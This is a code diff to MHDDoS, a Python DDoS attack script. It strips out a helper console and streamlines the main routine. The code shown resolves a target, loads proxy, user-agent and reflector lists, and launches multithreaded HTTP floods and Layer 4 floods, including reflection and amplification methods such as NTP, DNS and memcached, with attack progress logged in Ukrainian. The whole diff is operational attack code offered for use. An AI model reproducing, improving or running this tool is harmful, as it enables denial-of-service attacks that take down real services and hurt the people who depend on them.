@@ -988,412 +988,138 @@ class HttpFlood(Thread):
         if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
-class ToolsConsole:
-    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
-
-    @staticmethod
-    def checkRawSocket():
-        with suppress(OSError):
-            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
-                return True
-        return False
-
-    @staticmethod
-    def runConsole():
-        cons = f"{gethostname()}@MHTools:~#"
-
-        while 1:
-            cmd = input(cons + " ").strip()
-            if not cmd: continue
-            if " " in cmd:
-                cmd, args = cmd.split(" ", 1)
-
-            cmd = cmd.upper()
-            if cmd == "HELP":
-                print("Tools:" + ", ".join(ToolsConsole.METHODS))
-                print("Commands: HELP, CLEAR, BACK, EXIT")
-                continue
-
-            if (cmd == "E") or \
-                    (cmd == "EXIT") or \
-                    (cmd == "Q") or \
-                    (cmd == "QUIT") or \
-                    (cmd == "LOGOUT") or \
-                    (cmd == "CLOSE"):
-                exit(-1)
-
-            if cmd == "CLEAR":
-                print("\033c")
-                continue
-
-            if not {cmd} & ToolsConsole.METHODS:
-                print(f"{cmd} command not found")
-                continue
-
-            if cmd == "DSTAT":
-                with suppress(KeyboardInterrupt):
-                    ld = net_io_counters(pernic=False)
-
-                    while True:
-                        sleep(1)
-
-                        od = ld
-                        ld = net_io_counters(pernic=False)
-
-                        t = [(last - now) for now, last in zip(od, ld)]
-
-                        logger.info(
-                            ("Bytes Sent %s\n"
-                             "Bytes Recived %s\n"
-                             "Packets Sent %s\n"
-                             "Packets Recived %s\n"
-                             "ErrIn %s\n"
-                             "ErrOut %s\n"
-                             "DropIn %s\n"
-                             "DropOut %s\n"
-                             "Cpu Usage %s\n"
-                             "Memory %s\n") %
-                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
-                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
-                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
-                             str(virtual_memory().percent) + "%"))
-            if cmd in ["CFIP", "DNS"]:
-                print("Soon")
-                continue
-
-            if cmd == "CHECK":
-                while True:
-                    with suppress(Exception):
-                        domain = input(f'{cons}give-me-ipaddress# ')
-                        if not domain: continue
-                        if domain.upper() == "BACK": break
-                        if domain.upper() == "CLEAR":
-                            print("\033c")
-                            continue
-                        if (domain.upper() == "E") or \
-                                (domain.upper() == "EXIT") or \
-                                (domain.upper() == "Q") or \
-                                (domain.upper() == "QUIT") or \
-                                (domain.upper() == "LOGOUT") or \
-                                (domain.upper() == "CLOSE"):
-                            exit(-1)
-                        if "/" not in domain: continue
-                        logger.info("please wait ...")
-
-                        with get(domain, timeout=20) as r:
-                            logger.info(('status_code: %d\n'
-                                      'status: %s') %
-                                      (r.status_code, "ONLINE"
-                                      if r.status_code <= 500 else "OFFLINE"))
-
-            if cmd == "INFO":
-                while True:
-                    domain = input(f'{cons}give-me-ipaddress# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
-                    if domain.upper() == "CLEAR":
-                        print("\033c")
-                        continue
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
-                        exit(-1)
-                    domain = domain.replace('https://',
-                                            '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
-                    print('please wait ...', end="\r")
-
-                    info = ToolsConsole.info(domain)
-
-                    if not info["success"]:
-                        print("Error!")
-                        continue
-
-                    logger.info(("Country: %s\n"
-                                 "City: %s\n"
-                                 "Org: %s\n"
-                                 "Isp: %s\n"
-                                 "Region: %s\n") %
-                                (info["country"], info["city"], info["org"],
-                                 info["isp"], info["region"]))
-
-            if cmd == "TSSRV":
-                while True:
-                    domain = input(f'{cons}give-me-domain# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
-                    if domain.upper() == "CLEAR":
-                        print("\033c")
-                        continue
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
-                        exit(-1)
-                    domain = domain.replace('https://',
-                                            '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
-                    print('please wait ...', end="\r")
-
-                    info = ToolsConsole.ts_srv(domain)
-                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
-                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
-
-            if cmd == "PING":
-                while True:
-                    domain = input(f'{cons}give-me-ipaddress# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
-                    if domain.upper() == "CLEAR":
-                        print("\033c")
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
-                        exit(-1)
-
-                    domain = domain.replace('https://',
-                                            '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
-
-                    logger.info("please wait ...")
-                    r = ping(domain, count=5, interval=0.2)
-                    logger.info(('Address: %s\n'
-                                 'Ping: %d\n'
-                                 'Aceepted Packets: %d/%d\n'
-                                 'status: %s\n') %
-                                (r.address, r.avg_rtt, r.packets_received,
-                                 r.packets_sent,
-                                 "ONLINE" if r.is_alive else "OFFLINE"))
-
-    @staticmethod
-    def stop():
-        print('All Attacks has been Stopped !')
-        for proc in process_iter():
-            if proc.name() == "python.exe":
-                proc.kill()
-
-    @staticmethod
-    def usage(argv):
-        print((
-                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
-                  'Note: If the Proxy list is empty, the attack will run without proxies\n'
-                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
-                  '      Proxy Type 0 = All in config.json\n'
-                  '      SocksTypes:\n'
-                  '         - 6 = RANDOM\n'
-                  '         - 5 = SOCKS5\n'
-                  '         - 4 = SOCKS4\n'
-                  '         - 1 = HTTP\n'
-                  '         - 0 = ALL\n'
-                  ' > Methods:\n'
-                  ' - Layer4\n'
-                  ' | %s | %d Methods\n'
-                  ' - Layer7\n'
-                  ' | %s | %d Methods\n'
-                  ' - Tools\n'
-                  ' | %s | %d Methods\n'
-                  ' - Others\n'
-                  ' | %s | %d Methods\n'
-                  ' - All %d Methods\n'
-                  '\n'
-                  'Example:\n'
-                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
-                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
-                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
-                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
-                  ' Amplification)>\n') %
-              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
-               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
-               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
-               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
-               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
-               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
-               argv[0], argv[0], argv[0], argv[0]))
-
-    # noinspection PyBroadException
-    @staticmethod
-    def ts_srv(domain):
-        records = ['_ts3._udp.', '_tsdns._tcp.']
-        DnsResolver = resolver.Resolver()
-        DnsResolver.timeout = 1
-        DnsResolver.lifetime = 1
-        Info = {}
-        for rec in records:
-            try:
-                srv_records = resolver.resolve(rec + domain, 'SRV')
-                for srv in srv_records:
-                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
-                        srv.port)
-            except:
-                Info[rec] = 'Not found'
-
-        return Info
-
-    # noinspection PyUnreachableCode
-    @staticmethod
-    def info(domain):
-        with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
-            return s.json()
-        return {"success": False}
-
-
 def main(argv):
-    with suppress(KeyboardInterrupt):
-        with suppress(IndexError):
-            one = argv[1].upper()
+    one = argv[1].upper()
+    method = one
+    port = None
+    url = None
+    event = Event()
+    event.clear()
+    target = None
+    urlraw = argv[2].strip()
+    if not urlraw.startswith("http"):
+        urlraw = "http://" + urlraw
 
-            if one == "HELP":
-                raise IndexError()
-            if one == "TOOLS":
-                ToolsConsole.runConsole()
-            if one == "STOP":
-                ToolsConsole.stop()
+    if method not in Methods.ALL_METHODS:
+        exit("Method Not Found %s" %
+             ", ".join(Methods.ALL_METHODS))
 
-            method = one
-            host = None
-            port= None
-            url = None
-            event = Event()
-            event.clear()
-            target = None
-            urlraw = argv[2].strip()
-            if not urlraw.startswith("http"):
-                urlraw = "http://" + urlraw
+    if method in Methods.LAYER7_METHODS:
+        url = URL(urlraw)
+        host = url.host
+        try:
+            host = gethostbyname(url.host)
+        except Exception as e:
+            exit('Cannot resolve hostname ', url.host, e)
+        threads = int(argv[4])
+        rpc = int(argv[6])
+        timer = int(argv[7])
+        proxy_li = Path(__dir__ / "files/proxies/" /
+                        argv[5].strip())
+        useragent_li = Path(__dir__ / "files/useragent.txt")
+        referers_li = Path(__dir__ / "files/referers.txt")
+        bombardier_path = Path.home() / "go/bin/bombardier"
 
-            if method not in Methods.ALL_METHODS:
-                exit("Method Not Found %s" %
-                     ", ".join(Methods.ALL_METHODS))
+        if method == "BOMB":
+            assert (
+                    bombardier_path.exists()
+                    or bombardier_path.with_suffix('.exe').exists()
+            ), (
+                "Install bombardier: "
+                "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
+            )
 
-            if method in Methods.LAYER7_METHODS:
-                url = URL(urlraw)
-                host = url.host
-                try:
-                    host = gethostbyname(url.host)
-                except Exception as e:
-                    exit('Cannot resolve hostname ', url.host, e)
-                threads = int(argv[4])
-                rpc = int(argv[6])
-                timer = int(argv[7])
-                proxy_li = Path(__dir__ / "files/proxies/" /
-                                argv[5].strip())
-                useragent_li = Path(__dir__ / "files/useragent.txt")
-                referers_li = Path(__dir__ / "files/referers.txt")
-                bombardier_path = Path.home() / "go/bin/bombardier"
+        if len(argv) == 9:
+            logger.setLevel("DEBUG")
 
-                if method == "BOMB":
-                    assert (
-                            bombardier_path.exists()
-                            or bombardier_path.with_suffix('.exe').exists()
-                    ), (
-                        "Install bombardier: "
-                        "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
-                    )
+        if not useragent_li.exists():
+            exit("The Useragent file doesn't exist ")
+        if not referers_li.exists():
+            exit("The Referer file doesn't exist ")
 
-                if len(argv) == 9:
+        uagents = set(a.strip()
+                      for a in useragent_li.open("r+").readlines())
+        referers = set(a.strip()
+                       for a in referers_li.open("r+").readlines())
+
+        if not uagents: exit("Empty Useragent File ")
+        if not referers: exit("Empty Referer File ")
+
+        proxies = ProxyUtiles.readFromFile(proxy_li)
+        for thread_id in range(threads):
+            HttpFlood(thread_id, url, host, method, rpc, event,
+                      uagents, referers, proxies).start()
+
+    if method in Methods.LAYER4_METHODS:
+        target = URL(urlraw)
+
+        port = target.port
+        target = target.host
+
+        try:
+            target = gethostbyname(target)
+        except Exception as e:
+            exit('Cannot resolve hostname ', target, e)
+
+        if port > 65535 or port < 1:
+            exit("Invalid Port [Min: 1 / Max: 65535] ")
+
+        threads = int(argv[3])
+        timer = int(argv[4])
+        proxies = None
+        ref = None
+        if not port:
+            logger.warning("Port Not Selected, Set To Default: 80")
+            port = 80
+
+        if len(argv) >= 6:
+            argfive = argv[5].strip()
+            if argfive:
+                refl_li = Path(__dir__ / "files" / argfive)
+                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
+                    if not refl_li.exists():
+                        exit("The reflector file doesn't exist")
+                    if len(argv) == 7:
+                        logger.setLevel("DEBUG")
+                    ref = set(a.strip()
+                              for a in ProxyTools.Patterns.IP.findall(
+                        refl_li.open("r+").read()))
+                    if not ref: exit("Empty Reflector File ")
+
+                elif argfive.isdigit() and len(argv) >= 7:
+                    if len(argv) == 8:
+                        logger.setLevel("DEBUG")
+                    proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
+                    proxies = ProxyUtiles.readFromFile(proxy_li)
+                    if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
+                        exit("this method cannot use for layer4 proxy")
+
+                else:
                     logger.setLevel("DEBUG")
 
-                if not useragent_li.exists():
-                    exit("The Useragent file doesn't exist ")
-                if not referers_li.exists():
-                    exit("The Referer file doesn't exist ")
+        for _ in range(threads):
+            Layer4((target, port), ref, method, event,
+                   proxies).start()
 
-                uagents = set(a.strip()
-                              for a in useragent_li.open("r+").readlines())
-                referers = set(a.strip()
-                               for a in referers_li.open("r+").readlines())
+    logger.info(
+        f"{bcolors.WARNING}Атакуємо{bcolors.OKBLUE} %s{bcolors.WARNING} методом{bcolors.OKBLUE} %s{bcolors.WARNING}, потоків:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
+        % (target or url.host, method, threads))
+    event.set()
+    ts = time()
+    while time() < ts + timer:
+        logger.debug(f'{bcolors.WARNING}Ціль:{bcolors.OKBLUE} %s,{bcolors.WARNING} Порт:{bcolors.OKBLUE} %s,{bcolors.WARNING} Метод:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
+                     (target or url.host,
+                      port or (url.port or 80),
+                      method,
+                      Tools.humanformat(int(REQUESTS_SENT)),
+                      Tools.humanbytes(int(BYTES_SEND)),
+                      round((time() - ts) / timer * 100, 2)))
+        REQUESTS_SENT.set(0)
+        BYTES_SEND.set(0)
+        sleep(1)
 
-                if not uagents: exit("Empty Useragent File ")
-                if not referers: exit("Empty Referer File ")
-
-                proxies = ProxyUtiles.readFromFile(proxy_li)
-                for thread_id in range(threads):
-                    HttpFlood(thread_id, url, host, method, rpc, event,
-                              uagents, referers, proxies).start()
-
-            if method in Methods.LAYER4_METHODS:
-                target = URL(urlraw)
-
-                port = target.port
-                target = target.host
-
-                try:
-                    target = gethostbyname(target)
-                except Exception as e:
-                    exit('Cannot resolve hostname ', url.host, e)
-
-                if port > 65535 or port < 1:
-                    exit("Invalid Port [Min: 1 / Max: 65535] ")
-
-                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN"} and \
-                        not ToolsConsole.checkRawSocket():
-                    exit("Cannot Create Raw Socket")
-
-                threads = int(argv[3])
-                timer = int(argv[4])
-                proxies = None
-                ref = None
-                if not port:
-                    logger.warning("Port Not Selected, Set To Default: 80")
-                    port = 80
-
-                if len(argv) >= 6:
-                    argfive = argv[5].strip()
-                    if argfive:
-                        refl_li = Path(__dir__ / "files" / argfive)
-                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
-                            if not refl_li.exists():
-                                exit("The reflector file doesn't exist")
-                            if len(argv) == 7:
-                                logger.setLevel("DEBUG")
-                            ref = set(a.strip()
-                                      for a in ProxyTools.Patterns.IP.findall(
-                                refl_li.open("r+").read()))
-                            if not ref: exit("Empty Reflector File ")
-
-                        elif argfive.isdigit() and len(argv) >= 7:
-                            if len(argv) == 8:
-                                logger.setLevel("DEBUG")
-                            proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
-                            proxies = ProxyUtiles.readFromFile(proxy_li)
-                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
-                                exit("this method cannot use for layer4 proxy")
-
-                        else:
-                            logger.setLevel("DEBUG")
-
-                for _ in range(threads):
-                    Layer4((target, port), ref, method, event,
-                           proxies).start()
-
-            logger.info(
-                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
-                % (target or url.host, method, timer, threads))
-            event.set()
-            ts = time()
-            while time() < ts + timer:
-                logger.debug(f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
-                             (target or url.host,
-                              port or (url.port or 80),
-                              method,
-                              Tools.humanformat(int(REQUESTS_SENT)),
-                              Tools.humanbytes(int(BYTES_SEND)),
-                              round((time() - ts) / timer * 100, 2)))
-                REQUESTS_SENT.set(0)
-                BYTES_SEND.set(0)
-                sleep(1)
-
-            event.clear()
-            exit()
-
-        ToolsConsole.usage(argv)
+    event.clear()
+    exit()
 
 
 if __name__ == '__main__':
